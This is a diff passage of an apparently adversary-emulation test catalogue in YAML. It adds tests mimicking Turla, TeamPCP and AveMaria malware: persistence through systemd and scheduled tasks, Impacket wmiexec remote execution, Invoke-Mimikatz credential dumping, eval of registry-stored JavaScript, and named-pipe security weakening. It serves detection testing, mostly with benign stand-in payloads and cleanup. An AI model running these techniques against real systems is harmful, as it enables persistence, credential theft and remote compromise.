           Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
-        cleanup_command: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}'
-          -Recurse -ErrorAction Ignore
+        cleanup_command: |-
+          $regPath = "HKCU\SOFTWARE\Classes\CLSID\#{clsid}"
+          $backupFile = "$env:TEMP\T1546.015_com_hijack_backup.reg"
+          reg delete "$regPath" /f 2>&1 | Out-Null
+          if (Test-Path $backupFile) {
+            reg import "$backupFile" 2>&1 | Out-Null
+            Remove-Item $backupFile -Force -ErrorAction Ignore
+          }
         name: powershell
     - name: Powershell Execute COM Object
       auto_generated_guid: 752191b1-7c71-445c-9dbe-21bb031b18eb
@@ -32974,6 +33507,68 @@ privilege-escalation:
           systemctl disable T1543.002
           rm -rf /etc/init.d/T1543.002
           systemctl daemon-reload
+    - name: TeamPCP Aqua Trivy Persistence
+      auto_generated_guid: a29738b0-0e14-488c-984f-6a851fcdbcfe
+      description: |
+        Simulates the persistence mechanism used by TeamPCP malware distributed via a hijacked
+        Aqua Trivy binary. Installs a user-level systemd service (sysmon) that drops a
+        Python script to ~/.config/systemd/user/sysmon.py. The script writes a second-stage
+        payload to #{pglog_path} and executes it in a new session. In the wild, the dropper polls
+        an ICP-hosted C2 canister for a download URL; this test creates the payload unconditionally
+        to avoid external network contact. Filepaths and names match observed IOCs.
+
+        Reference: https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/
+      supported_platforms:
+      - linux
+      input_arguments:
+        pglog_path:
+          description: Path where the dropper writes and executes the second-stage
+            payload
+          type: path
+          default: "/tmp/pglog"
+        sysmon_script_path:
+          description: Path to the sysmon Python script copied into the user systemd
+            directory
+          type: path
+          default: "$PathToAtomicsFolder/T1543.002/src/sysmon.py"
+      dependencies:
+      - description: python3 must be installed
+        prereq_command: 'which python3 > /dev/null 2>&1
+
+          '
+        get_prereq_command: 'apt-get install -y python3 2>/dev/null || yum install
+          -y python3 2>/dev/null
+
+          '
+      dependency_executor_name: bash
+      executor:
+        name: bash
+        elevation_required: false
+        command: |
+          mkdir -p $HOME/.config/systemd/user
+          cp "#{sysmon_script_path}" "$HOME/.config/systemd/user/sysmon.py"
+          echo "[Unit]" > $HOME/.config/systemd/user/sysmon.service
+          echo "Description=System Monitor Service" >> $HOME/.config/systemd/user/sysmon.service
+          echo "" >> $HOME/.config/systemd/user/sysmon.service
+          echo "[Service]" >> $HOME/.config/systemd/user/sysmon.service
+          echo "Type=simple" >> $HOME/.config/systemd/user/sysmon.service
+          echo "ExecStart=/usr/bin/python3 $HOME/.config/systemd/user/sysmon.py \"#{pglog_path}\"" >> $HOME/.config/systemd/user/sysmon.service
+          echo "Restart=always" >> $HOME/.config/systemd/user/sysmon.service
+          echo "" >> $HOME/.config/systemd/user/sysmon.service
+          echo "[Install]" >> $HOME/.config/systemd/user/sysmon.service
+          echo "WantedBy=default.target" >> $HOME/.config/systemd/user/sysmon.service
+          systemctl --user daemon-reload
+          systemctl --user enable sysmon.service
+          systemctl --user start sysmon.service
+          loginctl enable-linger $USER
+        cleanup_command: |
+          systemctl --user stop sysmon.service
+          systemctl --user disable sysmon.service
+          rm -f $HOME/.config/systemd/user/sysmon.service
+          rm -f $HOME/.config/systemd/user/sysmon.py
+          rm -f #{pglog_path}
+          systemctl --user daemon-reload
+          loginctl disable-linger $USER
   T1547.013:
     technique:
       type: attack-pattern
@@ -35338,6 +35933,91 @@ execution:
         cleanup_command: |
           reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
           schtasks /Delete /TN "#{task_name}" /F
+    - name: Turla Topinambour Dropper and Scheduled Task Persistence
+      auto_generated_guid: 1a73e89e-a5de-404d-9784-5c2aa0b38a29
+      description: |
+        Emulates the dropper behavior of Turla's Topinambour. Uses inline C# compiled via
+        Add-Type to replicate the dropper's unpack_p() and make_some_noise() functions. unpack_p() drops a
+        benign stand-in executable to %LOCALAPPDATA%\VirtualStore\certcheck.exe, and make_some_noise() creates
+        a scheduled task named VerifiedPublisherCertCheck that runs certcheck.exe every 30 minutes.
+
+        Reference: https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/
+      supported_platforms:
+      - windows
+      input_arguments:
+        benign_exe:
+          description: Benign executable to copy as the stand-in payload (simulates
+            the dropped backdoor)
+          type: path
+          default: C:\Windows\System32\hostname.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Back up any existing certcheck.exe in VirtualStore before overwriting
+        prereq_command: |
+          $dropPath = "$env:LOCALAPPDATA\VirtualStore\certcheck.exe"
+          if ((Test-Path "$env:TEMP\T1053005_certcheck_backup.exe") -or !(Test-Path $dropPath)) { exit 0 } else { exit 1 }
+        get_prereq_command: 'Copy-Item "$env:LOCALAPPDATA\VirtualStore\certcheck.exe"
+          "$env:TEMP\T1053005_certcheck_backup.exe" -Force
+
+          '
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Add-Type @'
+          using System;
+          using System.Diagnostics;
+          using System.IO;
+
+          public class TopinambourDropper {
+              public static void unpack_p(string sourceExe) {
+                  string dropPath = Path.Combine(Environment.GetEnvironmentVariable("LOCALAPPDATA"), "VirtualStore", "certcheck.exe");
+                  Directory.CreateDirectory(Path.GetDirectoryName(dropPath));
+                  File.Copy(sourceExe, dropPath, true);
+              }
+
+              public static void make_some_noise() {
+                  ProcessStartInfo startInfo = new ProcessStartInfo("cmd", "/c schtasks /create /SC MINUTE /MO 30 /TR \"%localappdata%\\VirtualStore\\certcheck.exe\" /TN VerifiedPublisherCertCheck /F")
+                  {
+                      CreateNoWindow = true,
+                      UseShellExecute = false
+                  };
+                  Process.Start(startInfo).WaitForExit();
+              }
+          }
+          '@
+          [TopinambourDropper]::unpack_p("#{benign_exe}")
+          [TopinambourDropper]::make_some_noise()
+        cleanup_command: |
+          schtasks /Delete /TN "VerifiedPublisherCertCheck" /F 2>&1 | Out-Null
+          if (Test-Path "$env:TEMP\T1053005_certcheck_backup.exe") {
+            Move-Item "$env:TEMP\T1053005_certcheck_backup.exe" "$env:LOCALAPPDATA\VirtualStore\certcheck.exe" -Force
+          } else {
+            Remove-Item "$env:LOCALAPPDATA\VirtualStore\certcheck.exe" -Force -ErrorAction SilentlyContinue
+          }
+    - name: Turla KopiLuwak Scheduled Task for JavaScript Stager
+      auto_generated_guid: 6731e8a0-5aeb-4180-8a90-4f8852e56de6
+      description: |
+        Emulates the KopiLuwak dropper's scheduled task creation stage. Creates a logon-triggered
+        scheduled task named ProactiveScan with description "NTFS Volume Health Scan" that runs
+        Chkdsk.js from the current user's AppData\Roaming\Microsoft directory with an RC4 decryption
+        key passed via the -scan parameter. The task is created using schtasks.exe matching the
+        malware's use of CreateScheduledTaskLogon. Chkdsk.js does not need to exist for the
+        scheduled task to be created.
+
+        Reference: https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'schtasks /create /TN "ProactiveScan" /TR "wscript.exe \"%APPDATA%\Microsoft\Chkdsk.js\"
+          -scan Kdw6gG7cpOSZsBeH" /SC ONLOGON /F
+
+          '
+        cleanup_command: 'schtasks /Delete /TN "ProactiveScan" /F >nul 2>&1
+
+          '
   T1047:
     technique:
       type: attack-pattern
@@ -35674,6 +36354,150 @@ execution:
           /qn /norestart
         name: command_prompt
         elevation_required: true
+    - name: Impacket wmiexec.py
+      auto_generated_guid: a3ddaf15-d1a1-4bc3-8683-84c7c67120fe
+      description: 'wmiexec.py is tool included in the Impacket toolkit that allows
+        to execute commands remotely on a Windows System using WMI (Windows management
+        Instrumentation).
+
+        '
+      supported_platforms:
+      - windows
+      input_arguments:
+        target_domain:
+          description: Domain of the Target machine.
+          type: string
+          default: "$env:USERDNSDOMAIN"
+        user_name:
+          description: username on the target machine.
+          type: string
+          default: "$env:USERNAME"
+        password:
+          description: password for the target machine
+          type: string
+          default: '1234'
+        target_host:
+          description: IP address or hostname of the target machine.
+          type: string
+          default: "$env:COMPUTERNAME"
+        command:
+          description: Command to execute on the target machine.
+          type: string
+          default: ipconfig
+        optional_args:
+          description: Additional arguments to use (like -k -no-pass)
+          type: string
+          default:
+        uv_install_dir:
+          description: Directory where the uv binary is installed
+          type: path
+          default: "$env:TEMP\\uv"
+        uv_tool_dir:
+          description: Directory where uv installs tool virtualenvs
+          type: path
+          default: "$env:TEMP\\uv\\tools"
+        uv_tool_bin_dir:
+          description: Directory where uv places tool executable shims
+          type: path
+          default: "$env:TEMP\\uv\\tools\\bin"
+      dependencies:
+      - description: 'uv must be installed
+
+          '
+        prereq_command: 'if (Test-Path "#{uv_install_dir}\uv.exe") { exit 0 } else
+          { exit 1 }
+
+          '
+        get_prereq_command: |
+          $env:UV_INSTALL_DIR = "#{uv_install_dir}"
+          irm https://astral.sh/uv/install.ps1 | iex
+          New-Item -ItemType File -Path "$env:TEMP\uv_installed_by_atomic" -Force | Out-Null
+      - description: 'Impacket must be installed via uv
+
+          '
+        prereq_command: 'if (Test-Path "#{uv_tool_bin_dir}\wmiexec.py") { exit 0 }
+          else { exit 1 }
+
+          '
+        get_prereq_command: |
+          $env:PATH = "#{uv_install_dir};#{uv_tool_bin_dir};$env:PATH"
+          $env:UV_TOOL_DIR = "#{uv_tool_dir}"
+          $env:UV_TOOL_BIN_DIR = "#{uv_tool_bin_dir}"
+          uv tool install impacket
+      executor:
+        command: |
+          cd #{uv_tool_bin_dir}
+          $optionalArgs = "#{optional_args}"
+          $argList = @("#{command}")
+          if (-not [string]::IsNullOrWhiteSpace($optionalArgs)) { $argList += $optionalArgs.Split(" ") }
+          .\wmiexec.py #{target_domain}/#{user_name}:#{password}@#{target_host} @argList
+        cleanup_command: |
+          $env:PATH = "#{uv_install_dir};#{uv_tool_bin_dir};$env:PATH"
+          $env:UV_TOOL_DIR = "#{uv_tool_dir}"
+          $env:UV_TOOL_BIN_DIR = "#{uv_tool_bin_dir}"
+          uv tool uninstall impacket 2>$null
+          Remove-Item "#{uv_tool_dir}" -Recurse -Force -ErrorAction SilentlyContinue
+          if (Test-Path "$env:TEMP\uv_installed_by_atomic") {
+            Remove-Item "$env:TEMP\uv_installed_by_atomic" -Force -ErrorAction SilentlyContinue
+            uv self uninstall 2>$null
+          }
+        name: powershell
+    - name: AveMaria/Warzone program.bat WMIC Process Creation
+      auto_generated_guid: 778b54b0-ae7a-4f80-b74b-59eddee87ad5
+      description: |
+        Emulates the evasive behavior of the Ave Maria/Warzone RAT, which follows these steps:
+        1. Creates a batch script (program_path) that runs commands found in its own ADS named start (program_path:start)
+        2. Writes to program_path:start a wmiexec command that starts a process from an ADS named ApplicationData of a specified file (ads_host:ApplicationData)
+        3. Writes to the ADS ads_host:ApplicationData the contents of an executable (normally would be the ransomware)
+        4. Runs the batch script, which runs everything that was set up
+
+        Reference: https://www.splunk.com/en_us/blog/security/defending-the-gates-understanding-and-detecting-ave-maria-warzone-rat.html
+      supported_platforms:
+      - windows
+      input_arguments:
+        payload_binary:
+          description: Benign executable to persist (stand-in for the malware payload)
+          type: path
+          default: C:\Windows\System32\calc.exe
+        program_path:
+          description: Full filepath (including filename) that the batch script is
+            created to
+          type: path
+          default: "$env:TEMP\\program.bat"
+        ads_host:
+          description: File the Alternate Data Stream ApplicationData is attached
+            to
+          type: path
+          default: "$env:TEMP\\ads"
+      dependencies:
+      - description: 'ads_host must exist
+
+          '
+        prereq_command: 'if (Test-Path -Path "#{ads_host}") { exit 0 } else { exit
+          1 }
+
+          '
+        get_prereq_command: |
+          $parent = Split-Path "#{ads_host}"
+          New-Item -ItemType Directory -Path "$parent" -Force
+          New-Item -ItemType File -Path "#{ads_host}" -Force
+          New-Item -ItemType File -Path "$env:TEMP\ads_created" -Force
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $parent = Split-Path "#{program_path}"
+          New-Item -ItemType Directory -Path "$parent" -Force
+          New-Item -ItemType File -Path "#{program_path}" -Force
+          Set-Content -Path "#{program_path}" -Value "for /F `"usebackq tokens=*`" %%A in (`"#{program_path}:start`") do %%A"
+          Set-Content -Path "#{program_path}" -Stream start -Value "wmic process call create `"#{ads_host}:ApplicationData`""
+          Get-Content "#{payload_binary}" -Encoding Byte -Raw | Set-Content -Path "#{ads_host}" -Stream ApplicationData -Encoding Byte
+          Start-Process "#{program_path}"
+        cleanup_command: |
+          Get-Process | Where-Object { $_.Path -eq "#{payload_binary}" } | Stop-Process -Force -ErrorAction SilentlyContinue
+          Remove-Item "#{program_path}" -Force -ErrorAction Ignore
+          if (Test-Path -Path "$env:TEMP\ads_created"){Remove-Item -Path "#{ads_host}" -ErrorAction Ignore} else {Remove-Item -Path "#{ads_host}" -Stream "ApplicationData" -ErrorAction Ignore}
+          Remove-Item -Path "$env:TEMP\ads_created" -Force -ErrorAction Ignore
   T1129:
     technique:
       type: attack-pattern
@@ -36004,6 +36828,134 @@ execution:
 
           '
         name: command_prompt
+    - name: Turla Kopiluwak Windows Enumeration
+      auto_generated_guid: e65e6772-bfd3-4f25-934b-861d5caa34db
+      description: |
+        Executes a JScript file via wscript.exe that runs a series of reconnaissance commands (net use, ipconfig,
+        systeminfo, whoami, tasklist, netstat, arp, dir, etc.) and appends all output to a single staging file
+        at c:\windows\temp\result2.dat. Output file name, wscript.exe execution, and reconnaisance commands run mirror the behaviors of Turla's Javascript trojan Kopiluwak
+
+        Reference: https://unit42.paloaltonetworks.com/turla-pensive-ursa-threat-assessment/
+      supported_platforms:
+      - windows
+      input_arguments:
+        jscript:
+          description: Path to the reconnaissance JScript file
+          type: path
+          default: PathToAtomicsFolder\T1059.007\src\xpexplore.js
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Reconnaissance JScript must exist on disk
+        prereq_command: 'if (Test-Path "#{jscript}") {exit 0} else {exit 1}
+
+          '
+        get_prereq_command: |
+          New-Item -ItemType Directory (Split-Path "#{jscript}") -Force | Out-Null
+          Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/xpexplore.js" -OutFile "#{jscript}"
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'wscript.exe /b "#{jscript}"
+
+          '
+        cleanup_command: 'del c:\windows\temp\result2.dat >nul 2>&1
+
+          '
+    - name: Turla KopiLuwak RC4 Decryption Stager
+      auto_generated_guid: '02428cbe-c230-4353-b31d-61c9d328b153'
+      description: |
+        Emulates KopiLuwak's next-stage JavaScript loader named Chkdsk.js. The script accepts an
+        RC4 decryption key via the -scan parameter and decrypts hardcoded ciphertext bytes, which are then run as script.
+        In this atomic, the decrypted bytes generate and display a random number instead of performing malicious behavior.
+        In the real attack chain, a scheduled task (ProactiveScan) invokes this script with the key every 30 minutes.
+
+        Reference: https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/
+      supported_platforms:
+      - windows
+      input_arguments:
+        chkdsk_path:
+          description: Path to the KopiLuwak Chkdsk.js stager script
+          type: path
+          default: PathToAtomicsFolder\T1059.007\src\Chkdsk.js
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Chkdsk.js must exist on disk
+        prereq_command: 'if (Test-Path "#{chkdsk_path}") {exit 0} else {exit 1}
+
+          '
+        get_prereq_command: |
+          New-Item -ItemType Directory (Split-Path "#{chkdsk_path}") -Force | Out-Null
+          Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/Chkdsk.js" -OutFile "#{chkdsk_path}"
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'wscript.exe /b "#{chkdsk_path}" -scan Kdw6gG7cpOSZsBeH
+
+          '
+    - name: Turla KopiLuwak Registry JavaScript Payload Execution
+      auto_generated_guid: 9be739ec-b1ba-4950-94d0-e62444b23645
+      description: |
+        Emulates KopiLuwak's technique of storing a JavaScript payload as REG_BINARY data in the Windows registry
+        and executing it. The script uses WMI StdRegProv to read binary data from
+        HKCU\Software\Microsoft\Windows\CurrentVersion\Maintenance\MOfficeMaintenance, converts the
+        bytes to a string with String.fromCharCode, and runs it with eval(). The registry path, value
+        name, and WMI access pattern mirror the real malware.
+
+        Reference: https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/
+      supported_platforms:
+      - windows
+      input_arguments:
+        payload:
+          description: JavaScript code to store in the registry as binary and execute
+            via eval
+          type: string
+          default: var shell = new ActiveXObject('WScript.Shell');shell.Exec('cmd.exe
+            /c whoami');
+        registry_script:
+          description: Path to the registry payload JScript file
+          type: path
+          default: PathToAtomicsFolder\T1059.007\src\registry_payload.js
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Registry payload JScript must exist on disk
+        prereq_command: 'if (Test-Path "#{registry_script}") {exit 0} else {exit 1}
+
+          '
+        get_prereq_command: |
+          New-Item -ItemType Directory (Split-Path "#{registry_script}") -Force | Out-Null
+          Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/registry_payload.js" -OutFile "#{registry_script}"
+      - description: Backup existing Maintenance registry key if present
+        prereq_command: 'if (!(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Maintenance")
+          -or (Test-Path "$env:TEMP\T1059.007_Maintenance.reg")) {exit 0} else {exit
+          1}
+
+          '
+        get_prereq_command: 'reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Maintenance"
+          "$env:TEMP\T1059.007_Maintenance.reg" /y 2>$null
+
+          '
+      - description: Payload must be written to registry as REG_BINARY
+        prereq_command: 'if ((Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Maintenance"
+          -Name "MOfficeMaintenance" -ErrorAction SilentlyContinue).MOfficeMaintenance)
+          {exit 0} else {exit 1}
+
+          '
+        get_prereq_command: |
+          $bytes = [System.Text.Encoding]::ASCII.GetBytes("#{payload}")
+          $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Maintenance"
+          if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+          Set-ItemProperty -Path $regPath -Name "MOfficeMaintenance" -Value $bytes -Type Binary
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'Start-Process wscript.exe -ArgumentList ''/b'', "#{registry_script}"
+          -Wait
+
+          '
+        cleanup_command: |
+          reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Maintenance" /v MOfficeMaintenance /f 2>$null
+          $bak = "$env:TEMP\T1059.007_Maintenance.reg"
+          if (Test-Path $bak) { reg import $bak 2>$null; Remove-Item $bak -Force -ErrorAction SilentlyContinue }
   T1053.007:
     technique:
       type: attack-pattern
@@ -40171,12 +41123,27 @@ execution:
           description: Mimikatz url
           type: url
           default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
-      executor:
-        command: 'powershell.exe "IEX (New-Object Net.WebClient).DownloadString(''#{mimurl}'');
-          Invoke-Mimikatz -DumpCreds"
+        mimpath:
+          description: Local path to save Invoke-Mimikatz.ps1
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\Powersploit\Invoke-Mimikatz.ps1
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Invoke-Mimikatz.ps1 must be on disk
+        prereq_command: 'if (Test-Path "#{mimpath}") { exit 0 } else { exit 1 }
 
           '
-        name: command_prompt
+        get_prereq_command: |
+          New-Item -Type Directory (Split-Path "#{mimpath}") -ErrorAction Ignore -Force | Out-Null
+          Invoke-WebRequest -Uri "#{mimurl}" -OutFile "#{mimpath}"
+      executor:
+        command: |
+          Import-Module "#{mimpath}"
+          Invoke-Mimikatz -DumpCreds
+        cleanup_command: 'Remove-Item "#{mimpath}" -Force -ErrorAction SilentlyContinue
+
+          '
+        name: powershell
         elevation_required: true
     - name: Run BloodHound from local disk
       auto_generated_guid: a21bb23e-e677-4ee7-af90-6931b57b6350
@@ -41608,6 +42575,101 @@ execution:
 
           '
         name: command_prompt
+    - name: Create Named Pipe
+      auto_generated_guid: 17521690-2183-460f-a182-5dfd6f9f0a7f
+      description: |
+        Creates a named pipe using PowerShell. Named pipes are a common inter-process communication mechanism
+        that adversaries use to facilitate data exchange between processes or as a command-and-control channel.
+      supported_platforms:
+      - windows
+      input_arguments:
+        pipe_name:
+          description: Name of the named pipe to create (without the \\.\pipe\ prefix)
+          type: string
+          default: atomic_pipe
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $pipe = New-Object System.IO.Pipes.NamedPipeServerStream("#{pipe_name}", [System.IO.Pipes.PipeDirection]::InOut)
+          Start-Sleep -Seconds 30
+          $pipe.Dispose()
+    - name: Named Pipe Integrity Reduction for Turla's RPC backdoor
+      auto_generated_guid: 7a8f8ae9-6b1d-4f7b-88e7-9ea01234eee5
+      description: |
+        Emulates the server-side behavior of Turla's RPC backdoors. First checks to see if the named pipe atctl is in the
+        registry key for NullSessionPipes, and if so, modifies the security descriptor of the pipe to allow untrusted/anonymous
+        integrity level callers via SetSecurityInfo. Essentially allows unauthenticated users to have privileged RCE on the server machine through RPC.
+
+        Reference: https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/
+      supported_platforms:
+      - windows
+      input_arguments:
+        pipe_name:
+          description: Name of the named pipe to create
+          type: string
+          default: atctl
+      dependency_executor_name: powershell
+      dependencies:
+      - description: NullSessionPipes must contain the pipe name for the security
+          descriptor to be set
+        prereq_command: |
+          $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
+          $current = (Get-ItemProperty -Path $regPath -Name "NullSessionPipes" -ErrorAction SilentlyContinue).NullSessionPipes
+          if ($current -contains "#{pipe_name}") { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
+          $current = (Get-ItemProperty -Path $regPath -Name "NullSessionPipes" -ErrorAction SilentlyContinue).NullSessionPipes
+          $updated = @($current) + "#{pipe_name}"
+          Set-ItemProperty -Path $regPath -Name "NullSessionPipes" -Value $updated -Type MultiString
+          New-Item -Type File "$env:TEMP\T1559_nullsession_added" -Force | Out-Null
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Add-Type @'
+          using System;
+          using System.IO.Pipes;
+          using System.Runtime.InteropServices;
+
+          public class TurlaPipe {
+              [DllImport("advapi32.dll", SetLastError = true)]
+              static extern uint SetSecurityInfo(SafeHandle handle, int objectType, int securityInformation, IntPtr owner, IntPtr group, IntPtr dacl, IntPtr sacl);
+
+              [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+              static extern bool ConvertStringSecurityDescriptorToSecurityDescriptorW(string sddl, uint revision, out IntPtr sd, out uint size);
+
+              [DllImport("advapi32.dll")]
+              static extern bool GetSecurityDescriptorSacl(IntPtr pSd, out bool present, out IntPtr pSacl, out bool defaulted);
+
+              [DllImport("kernel32.dll")]
+              static extern IntPtr LocalFree(IntPtr hMem);
+
+              public static void CreateAndSetLabel(string pipeName) {
+                  var pipe = new NamedPipeServerStream(pipeName, PipeDirection.InOut);
+                  IntPtr pSd;
+                  uint sdSize;
+                  ConvertStringSecurityDescriptorToSecurityDescriptorW("S:(ML;;NW;;;S-1-16-0)", 1, out pSd, out sdSize);
+                  bool present, defaulted;
+                  IntPtr pSacl;
+                  GetSecurityDescriptorSacl(pSd, out present, out pSacl, out defaulted);
+                  SetSecurityInfo(pipe.SafePipeHandle, 6, 0x10, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, pSacl);
+                  LocalFree(pSd);
+                  pipe.Dispose();
+              }
+          }
+          '@
+          [TurlaPipe]::CreateAndSetLabel("#{pipe_name}")
+        cleanup_command: |
+          if (Test-Path "$env:TEMP\T1559_nullsession_added") {
+            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
+            $current = (Get-ItemProperty -Path $regPath -Name "NullSessionPipes" -ErrorAction SilentlyContinue).NullSessionPipes
+            if ($current -contains "#{pipe_name}") {
+              $updated = $current | Where-Object { $_ -ne "#{pipe_name}" }
+              Set-ItemProperty -Path $regPath -Name "NullSessionPipes" -Value $updated -Type MultiString
+            }
+          }
+          Remove-Item "$env:TEMP\T1559_nullsession_added" -Force -ErrorAction SilentlyContinue
   T1574:
     technique:
       type: attack-pattern
@@ -43658,6 +44720,17 @@ execution:
           type: string
           default: "$ENV:COMPUTERNAME"
       dependencies:
+      - description: 'WMIC must be installed (deprecated and removed by default in
+          Windows 11 22H2+)
+
+          '
+        prereq_command: 'if (Get-Command wmic.exe -ErrorAction SilentlyContinue) {
+          exit 0 } else { exit 1 }
+
+          '
+        get_prereq_command: 'DISM /Online /Add-Capability /CapabilityName:WMIC~~~~
+
+          '
       - description: 'PsExec must exist on disk at "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"
 
           '
@@ -43679,7 +44752,11 @@ execution:
           cmd.exe  /c echo \"--access-token\"\"\n"
         cleanup_command: "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters
           /v MaxMpxCt /f\ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2L:0\"
-          \ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:0\"\nrm $env:temp\\psexec.exe\n"
+          \ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:0\"\nrm $env:temp\\psexec.exe\nRemove-Item
+          \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\nRemove-Item
+          \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force -Recurse -ErrorAction
+          SilentlyContinue\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"
+          -Force -Recurse -ErrorAction SilentlyContinue\n"
         name: powershell
         elevation_required: true
     - name: Use RemCom to execute a command on a remote host
@@ -44857,6 +45934,91 @@ persistence:
         cleanup_command: |
           reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
           schtasks /Delete /TN "#{task_name}" /F
+    - name: Turla Topinambour Dropper and Scheduled Task Persistence
+      auto_generated_guid: 1a73e89e-a5de-404d-9784-5c2aa0b38a29
+      description: |
+        Emulates the dropper behavior of Turla's Topinambour. Uses inline C# compiled via
+        Add-Type to replicate the dropper's unpack_p() and make_some_noise() functions. unpack_p() drops a
+        benign stand-in executable to %LOCALAPPDATA%\VirtualStore\certcheck.exe, and make_some_noise() creates
+        a scheduled task named VerifiedPublisherCertCheck that runs certcheck.exe every 30 minutes.
+
+        Reference: https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/
+      supported_platforms:
+      - windows
+      input_arguments:
+        benign_exe:
+          description: Benign executable to copy as the stand-in payload (simulates
+            the dropped backdoor)
+          type: path
+          default: C:\Windows\System32\hostname.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Back up any existing certcheck.exe in VirtualStore before overwriting
+        prereq_command: |
+          $dropPath = "$env:LOCALAPPDATA\VirtualStore\certcheck.exe"
+          if ((Test-Path "$env:TEMP\T1053005_certcheck_backup.exe") -or !(Test-Path $dropPath)) { exit 0 } else { exit 1 }
+        get_prereq_command: 'Copy-Item "$env:LOCALAPPDATA\VirtualStore\certcheck.exe"
+          "$env:TEMP\T1053005_certcheck_backup.exe" -Force
+
+          '
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Add-Type @'
+          using System;
+          using System.Diagnostics;
+          using System.IO;
+
+          public class TopinambourDropper {
+              public static void unpack_p(string sourceExe) {
+                  string dropPath = Path.Combine(Environment.GetEnvironmentVariable("LOCALAPPDATA"), "VirtualStore", "certcheck.exe");
+                  Directory.CreateDirectory(Path.GetDirectoryName(dropPath));
+                  File.Copy(sourceExe, dropPath, true);
+              }
+
+              public static void make_some_noise() {
+                  ProcessStartInfo startInfo = new ProcessStartInfo("cmd", "/c schtasks /create /SC MINUTE /MO 30 /TR \"%localappdata%\\VirtualStore\\certcheck.exe\" /TN VerifiedPublisherCertCheck /F")
+                  {
+                      CreateNoWindow = true,
+                      UseShellExecute = false
+                  };
+                  Process.Start(startInfo).WaitForExit();
+              }
+          }
+          '@
+          [TopinambourDropper]::unpack_p("#{benign_exe}")
+          [TopinambourDropper]::make_some_noise()
+        cleanup_command: |
+          schtasks /Delete /TN "VerifiedPublisherCertCheck" /F 2>&1 | Out-Null
+          if (Test-Path "$env:TEMP\T1053005_certcheck_backup.exe") {
+            Move-Item "$env:TEMP\T1053005_certcheck_backup.exe" "$env:LOCALAPPDATA\VirtualStore\certcheck.exe" -Force
+          } else {
+            Remove-Item "$env:LOCALAPPDATA\VirtualStore\certcheck.exe" -Force -ErrorAction SilentlyContinue
+          }
+    - name: Turla KopiLuwak Scheduled Task for JavaScript Stager
+      auto_generated_guid: 6731e8a0-5aeb-4180-8a90-4f8852e56de6
+      description: |
+        Emulates the KopiLuwak dropper's scheduled task creation stage. Creates a logon-triggered
+        scheduled task named ProactiveScan with description "NTFS Volume Health Scan" that runs
+        Chkdsk.js from the current user's AppData\Roaming\Microsoft directory with an RC4 decryption
+        key passed via the -scan parameter. The task is created using schtasks.exe matching the
+        malware's use of CreateScheduledTaskLogon. Chkdsk.js does not need to exist for the
+        scheduled task to be created.
+
+        Reference: https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'schtasks /create /TN "ProactiveScan" /TR "wscript.exe \"%APPDATA%\Microsoft\Chkdsk.js\"
+          -scan Kdw6gG7cpOSZsBeH" /SC ONLOGON /F
+
+          '
+        cleanup_command: 'schtasks /Delete /TN "ProactiveScan" /F >nul 2>&1
+
+          '
